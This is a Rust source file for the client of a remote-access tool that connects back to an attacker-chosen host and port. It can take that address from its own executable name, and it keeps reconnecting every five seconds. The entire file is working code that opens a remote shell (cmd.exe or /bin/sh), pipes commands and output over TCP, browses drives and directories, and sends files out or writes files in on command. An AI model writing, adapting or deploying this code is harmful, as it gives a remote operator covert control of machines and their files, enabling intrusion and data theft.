mod protocol;
use protocol::*;

use std::fs::File;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::{Child, Command, Stdio};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, UNIX_EPOCH};

#[cfg(target_os = "windows")]
const SHELL: &str = "cmd.exe";
#[cfg(not(target_os = "windows"))]
const SHELL: &str = "/bin/sh";

const RECONNECT_DELAY: u64 = 5;

fn main() {
    let (host, port) = match parse_args() {
        Ok(v) => v,
        Err(e) => {
            eprintln!("[!] {}", e);
            eprintln!("Usage: target <host> <port>");
            eprintln!("   or:  target_<host>_<port>.exe");
            std::process::exit(1);
        }
    };

    let addr = format!("{}:{}", host, port);
    loop {
        eprintln!("[*] connecting to {} ...", addr);
        let stream = match TcpStream::connect(&addr) {
            Ok(s) => s,
            Err(e) => {
                eprintln!("[!] connect: {} (retry in {}s)", e, RECONNECT_DELAY);
                thread::sleep(Duration::from_secs(RECONNECT_DELAY));
                continue;
            }
        };

        eprintln!("[*] connected to {}", addr);
        let stream = Arc::new(Mutex::new(stream));
        let mut shell: Option<Child> = None;

        'inner: loop {
            if let Some(ref mut c) = shell {
                if let Ok(Some(_)) = c.try_wait() {
                    shell = None;
                }
            }

            let frame = loop {
                if let Some(ref mut c) = shell {
                    if let Ok(Some(_)) = c.try_wait() {
                        shell = None;
                    }
                }

                let mut s = stream.lock().unwrap();
                s.set_read_timeout(Some(Duration::from_millis(100))).ok();
                match read_frame(&mut *s) {
                    Ok(f) => break f,
                    Err(ref e)
                        if e.kind() == io::ErrorKind::WouldBlock
                            || e.kind() == io::ErrorKind::TimedOut =>
                    {
                        continue;
                    }
                    Err(e) => {
                        eprintln!("[!] connection lost: {} (reconnecting in {}s)", e, RECONNECT_DELAY);
                        break 'inner;
                    }
                }
            };

            match frame {
                Frame::Msg(msg) => match msg {
                    Message::ListDir(path) => {
                        handle_list_dir(&stream, &path);
                    }
                    Message::StartShell => {
                        if shell.is_some() {
                            let mut s = stream.lock().unwrap();
                            let _ = write_msg(&mut *s, &Message::Error("shell already running".into()));
                            continue;
                        }
                        match spawn_shell(&stream) {
                            Ok(child) => {
                                shell = Some(child);
                                let mut s = stream.lock().unwrap();
                                let _ = write_msg(&mut *s, &Message::Success);
                            }
                            Err(e) => {
                                let mut s = stream.lock().unwrap();
                                let _ = write_msg(&mut *s, &Message::Error(format!("spawn: {}", e)));
                            }
                        }
                    }
                    Message::StopShell => {
                        if let Some(mut c) = shell.take() {
                            let _ = c.kill();
                            let _ = c.wait();
                        }
                        let mut s = stream.lock().unwrap();
                        let _ = write_msg(&mut *s, &Message::Success);
                    }
                    Message::CmdInput(line) => {
                        if let Some(ref mut c) = shell {
                            if let Some(ref mut stdin) = c.stdin {
                                let _ = writeln!(stdin, "{}", line);
                                let _ = stdin.flush();
                            }
                        }
                    }
                    Message::DownloadRequest(path) => {
                        if let Err(e) = handle_download(&stream, &path) {
                            let mut s = stream.lock().unwrap();
                            let _ = write_msg(&mut *s, &Message::FileError(format!("{}", e)));
                        }
                    }
                    Message::UploadRequest(path) => {
                        if let Err(e) = handle_upload(&stream, &path) {
                            let mut s = stream.lock().unwrap();
                            let _ = write_msg(&mut *s, &Message::FileError(format!("{}", e)));
                        }
                    }
                    Message::Exit => return,
                    _ => {}
                },
                Frame::Chunk(_) => {
                    let mut s = stream.lock().unwrap();
                    let _ = write_msg(&mut *s, &Message::Error("unexpected file chunk".into()));
                }
            }
        }

        if let Some(mut c) = shell.take() {
            let _ = c.kill();
            let _ = c.wait();
        }
        // Inner loop broke (connection lost or Exit) — outer loop retries
        thread::sleep(Duration::from_secs(RECONNECT_DELAY));
    }
}

fn handle_list_dir(stream: &Arc<Mutex<TcpStream>>, path: &str) {
    let entries = if path.is_empty() || path == "::drives" {
        get_drives()
    } else {
        match std::fs::read_dir(path) {
            Ok(rd) => rd
                .filter_map(|e| e.ok())
                .map(|e| {
                    let meta = e.metadata().ok();
                    let modified = meta
                        .as_ref()
                        .and_then(|m| m.modified().ok())
                        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
                        .map(|d| d.as_secs())
                        .unwrap_or(0);
                    DirEntry {
                        name: e.file_name().to_string_lossy().to_string(),
                        is_dir: meta.as_ref().map(|m| m.is_dir()).unwrap_or(false),
                        size: meta.as_ref().map(|m| m.len()).unwrap_or(0),
                        modified: format_ts(modified),
                    }
                })
                .collect::<Vec<_>>(),
            Err(e) => {
                let mut s = stream.lock().unwrap();
                let _ = write_msg(&mut *s, &Message::FileError(format!("read_dir: {}", e)));
                return;
            }
        }
    };

    let mut s = stream.lock().unwrap();
    let _ = write_msg(&mut *s, &Message::DirEntries(entries));
}

#[cfg(target_os = "windows")]
fn get_drives() -> Vec<DirEntry> {
    let mut drives = Vec::new();
    for letter in b'A'..=b'Z' {
        let path = format!("{}:\\", letter as char);
        if std::fs::metadata(&path).is_ok() {
            drives.push(DirEntry {
                name: format!("{}:", letter as char),
                is_dir: true,
                size: 0,
                modified: String::new(),
            });
        }
    }
    drives
}

#[cfg(not(target_os = "windows"))]
fn get_drives() -> Vec<DirEntry> {
    vec![DirEntry {
        name: "/".into(),
        is_dir: true,
        size: 0,
        modified: String::new(),
    }]
}

fn format_ts(secs: u64) -> String {
    // Simple: YYYY-MM-DD HH:MM
    let s = secs as i64;
    let days = s / 86400;
    let time_secs = s % 86400;
    let h = time_secs / 3600;
    let m = (time_secs % 3600) / 60;

    // Approximate year (since 1970)
    let mut y = 1970i64;
    let mut rem = days;
    loop {
        let leap = if y % 4 == 0 && (y % 100 != 0 || y % 400 == 0) { 366 } else { 365 };
        if rem < leap { break; }
        rem -= leap;
        y += 1;
    }
    // rough month
    let md = [31, if y % 4 == 0 && (y % 100 != 0 || y % 400 == 0) { 29 } else { 28 }, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let mut mo = 0usize;
    for (i, &d) in md.iter().enumerate() {
        if rem < d { mo = i; break; }
        rem -= d;
    }

    format!("{:04}-{:02}-{:02} {:02}:{:02}", y, mo + 1, rem + 1, h, m)
}

// ── Argument parsing ──

fn parse_args() -> Result<(String, u16), String> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() >= 3 {
        let port = args[2]
            .parse::<u16>()
            .map_err(|_| format!("invalid port '{}'", args[2]))?;
        Ok((args[1].clone(), port))
    } else {
        let exe = std::env::args().next().unwrap_or_default();
        let name = std::path::Path::new(&exe)
            .file_stem()
            .and_then(|s| s.to_str())
            .unwrap_or("");
        let parts: Vec<&str> = name.split('_').collect();
        if parts.len() >= 3 {
            let port = parts[2]
                .parse::<u16>()
                .map_err(|_| "invalid port in exe name".to_string())?;
            Ok((parts[1].to_string(), port))
        } else {
            Err("not enough arguments".into())
        }
    }
}

// ── Shell lifecycle ──

fn spawn_shell(main_stream: &Arc<Mutex<TcpStream>>) -> Result<Child, io::Error> {
    #[cfg(target_os = "windows")]
    let mut child = Command::new(SHELL)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;
    #[cfg(not(target_os = "windows"))]
    let mut child = Command::new("script")
        .args(["-q", "-c", SHELL, "/dev/null"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    let stdout = child.stdout.take().unwrap();
    let stderr = child.stderr.take().unwrap();

    let s1 = main_stream.clone();
    let s2 = main_stream.clone();

    thread::spawn(move || pipe_output(s1, stdout, true));
    thread::spawn(move || pipe_output(s2, stderr, false));

    Ok(child)
}

fn pipe_output(stream: Arc<Mutex<TcpStream>>, mut rdr: impl Read + Send + 'static, send_close: bool) {
    let mut buf = [0u8; 4096];
    loop {
        match rdr.read(&mut buf) {
            Ok(0) | Err(_) => break,
            Ok(n) => {
                let text = String::from_utf8_lossy(&buf[..n]).into_owned();
                let mut s = stream.lock().unwrap();
                if write_msg(&mut *s, &Message::CmdOutput(text)).is_err() {
                    break;
                }
            }
        }
    }
    if send_close {
        let mut s = stream.lock().unwrap();
        let _ = write_msg(&mut *s, &Message::ShellClosed);
    }
}

// ── File transfer ──

fn handle_download(stream: &Arc<Mutex<TcpStream>>, path: &str) -> Result<(), io::Error> {
    let mut file = File::open(path)?;
    let total_size = file.metadata()?.len();
    let mut offset = 0u64;

    loop {
        let mut buf = vec![0u8; CHUNK_SIZE];
        let n = file.read(&mut buf)?;
        if n == 0 {
            break;
        }
        buf.truncate(n);
        let is_last = (offset + n as u64) >= total_size;
        {
            let mut s = stream.lock().unwrap();
            write_chunk(&mut *s, &FileChunk { total_size, offset, is_last, data: buf })?;
        }
        offset += n as u64;
        if is_last {
            break;
        }
    }

    let mut s = stream.lock().unwrap();
    match read_frame(&mut *s)? {
        Frame::Msg(Message::FileDone) | Frame::Msg(Message::Success) => Ok(()),
        Frame::Msg(Message::FileError(e)) => Err(io::Error::new(io::ErrorKind::Other, e)),
        _ => Err(io::Error::new(io::ErrorKind::Other, "unexpected response")),
    }
}

fn handle_upload(stream: &Arc<Mutex<TcpStream>>, path: &str) -> Result<(), io::Error> {
    {
        let mut s = stream.lock().unwrap();
        write_msg(&mut *s, &Message::FileReady)?;
    }

    let mut file = File::create(path)?;
    loop {
        let frame = {
            let mut s = stream.lock().unwrap();
            read_frame(&mut *s)
        };
        match frame? {
            Frame::Chunk(chunk) => {
                file.write_all(&chunk.data)?;
                if chunk.is_last {
                    break;
                }
            }
            Frame::Msg(Message::FileError(e)) => {
                return Err(io::Error::new(io::ErrorKind::Other, e));
            }
            Frame::Msg(Message::Exit) | Frame::Msg(Message::StopShell) => {
                return Err(io::Error::new(io::ErrorKind::Other, "transfer interrupted"));
            }
            _ => {}
        }
    }
    let mut s = stream.lock().unwrap();
    write_msg(&mut *s, &Message::Success)?;
    Ok(())
}
